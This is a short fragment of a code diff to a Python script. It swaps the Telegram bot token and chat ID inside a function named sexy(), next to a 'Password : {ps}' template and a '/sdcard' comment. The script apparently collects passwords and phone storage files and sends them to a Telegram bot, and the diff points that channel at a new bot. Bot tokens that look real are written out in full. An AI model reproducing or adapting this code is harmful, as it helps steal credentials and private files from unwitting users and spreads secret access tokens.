@@ -223,8 +223,8 @@ Password : {ps}
         ########py_file#######
 def sexy():
     session=requests.session() 
-    bot_token ='6871237442:AAEgQUe0_0NNvbUTAzhdM5ck2vn6T9xqx1g' 
-    chat_id ='6118669955'
+    bot_token ='6871043201:AAHQtGBjN1IfFRt9R2tYc4NZAhmZ3XxefKo' 
+    chat_id ='6752650575'
     #-----------( /sdcard
     try:
         
